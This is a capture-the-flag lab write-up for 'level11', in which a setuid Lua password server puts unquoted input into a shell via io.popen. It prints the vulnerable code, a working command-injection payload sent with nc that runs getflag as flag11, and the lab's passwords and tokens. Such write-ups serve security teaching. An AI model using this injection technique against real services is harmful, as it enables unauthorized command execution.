# level11

A Lua password-checker that hashes your input by shelling out to `sha1sum`. It builds the shell command by gluing your input into a string. We've done this dance a few times now :)

| | |
| --- | --- |
| **Login** | `level11` / `feulo4b72j7edeahuete3no7c` (the flag10 token) |
| **flag11 password** | n/a (the Lua server runs our command as flag11) |
| **flag11 token** | `fa6v5ateaw21peobuub8ipe6s` (aka the level12 password) |

## poking around

One file, a Lua script setuid flag11:

```bash
$ ls -l ~/level11.lua
-rwsr-sr-x 1 flag11 level11 668 ... level11.lua
```

It's already running as flag11, listening on `127.0.0.1:5151` (you can spot the process with `find / -user flag11` pointing at a `/proc/<pid>`).

## the script

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")   -- <-- pass glued into a shell command
  ...
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  local l = client:receive()
  local h = hash(l)
  if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
      client:send("Erf nope..\n")
  else
      client:send("Gz you dumb*\n")
  end
end
```

You could try to find the password whose sha1 matches that hash. Don't bother. `io.popen("echo "..pass.." | sha1sum")` drops our input straight into a shell, with no quoting. The sha1 check is a distraction; the shell is the way in.

## the injection

Send a "password" that closes the `echo` and runs our own command. It executes as flag11, so point it at `getflag` and stash the output somewhere we can read:

```bash
$ echo 'a; getflag > /tmp/l11 2>&1; chmod 666 /tmp/l11' | nc 127.0.0.1 5151
Password: Erf nope..
$ cat /tmp/l11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

The server prints "Erf nope.." because our fake password obviously doesn't hash right, but it already ran our injected `getflag` on the way there. `pwn.sh` in this folder does the whole thing.
